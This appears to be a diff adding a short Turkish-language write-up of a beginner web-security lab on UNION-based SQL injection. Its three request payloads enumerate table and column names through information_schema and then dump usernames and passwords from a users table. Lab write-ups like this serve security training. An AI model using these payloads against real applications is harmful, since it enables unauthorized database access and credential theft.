@@ -1,0 +1,23 @@
+Lab: SQL injection attack, listing the database contents on non-Oracle databases
+kategori: SQL injection
+seviye: çırak1.0
+
+açıklama:
+burada biz ne sütun adını ne de tablonun adını biliyoruz. İlk önce bunları bulmalıyız ki veriye erişelim.
+bunun için gereken değişken table_name ve column_name
+
+request1: 
+'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
+buradaki information_schema.tables table_name lerin tutulduğu bir tablo
+bu sorgu sonucunda gereken tablomuzun ismini öğrenirsin. 
+
+ama bize sütun adı da gerekiyor
+request2:
+'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
+öğrendiğin sütun bilgilerini uygun bir şekilde sorguya koy
+ request3:
+'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
+
+ve bitti istediğin bilgileri elde ettin.
+Ama tabiki böyle bir site bulamazsın bu çok basit bir attack. Ama eğlenceli değil mi?
+
